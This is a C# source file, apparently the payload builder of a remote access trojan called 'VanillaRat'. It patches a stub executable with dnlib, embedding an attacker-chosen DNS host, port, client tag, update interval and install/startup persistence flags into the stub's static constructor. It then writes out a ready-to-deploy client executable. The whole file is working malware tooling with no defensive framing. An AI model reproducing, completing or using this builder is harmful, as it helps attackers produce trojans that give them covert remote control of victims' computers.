using System;
using System.IO;
using System.Linq;
using dnlib.DotNet;
using VanillaRatStub;

namespace VanillaRat.Classes
{
    internal class Builder
    {
        //Build client
        public void BuildClient(string Port, string DNS, string Name, string ClientTag, string UpdateInterval,
            string Install, string Startup)
        {
            ClientSettings.DNS = DNS;
            ClientSettings.Port = Port;
            ClientSettings.ClientTag = ClientTag;
            ClientSettings.UpdateInterval = UpdateInterval;
            ClientSettings.Install = Install == "True" ? "True" : "False";
            ClientSettings.Startup = Startup == "True" ? "True" : "False";           
            string FullName = "VanillaRatStub.ClientSettings";
            var Assembly = AssemblyDef.Load("VanillaStub.exe");
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = ClientSettings.DNS;
                        Constructor.Body.Instructions[2].Operand = ClientSettings.Port;
                        Constructor.Body.Instructions[4].Operand = ClientSettings.ClientTag;
                        Constructor.Body.Instructions[6].Operand = ClientSettings.UpdateInterval;
                        Constructor.Body.Instructions[8].Operand = ClientSettings.Install;
                        Constructor.Body.Instructions[10].Operand = ClientSettings.Startup;
                        if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                            Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                        Assembly.Write(Environment.CurrentDirectory + @"\Clients\" + Name + ".exe");
                    }
                }
            }
        }
    }
}